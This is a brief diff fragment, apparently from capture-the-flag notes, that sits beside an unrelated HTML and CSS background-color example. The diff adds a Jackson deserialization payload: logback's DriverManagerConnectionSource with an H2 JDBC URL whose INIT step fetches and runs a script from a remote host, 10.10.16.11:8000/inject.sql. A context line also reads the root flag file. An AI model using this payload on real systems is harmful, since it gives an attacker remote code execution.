@@ -139,5 +139,9 @@ cat /root/root.txt
 <h1 style="background-color:powderblue;">This is a heading</h1>
 
 <p>The CSS <code>background-color</code> property defines the background color of an element.</p>
+
+<code>["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.16.11:8000/inject.sql'"}]</code>
+
+
 ![]()
 ![]()
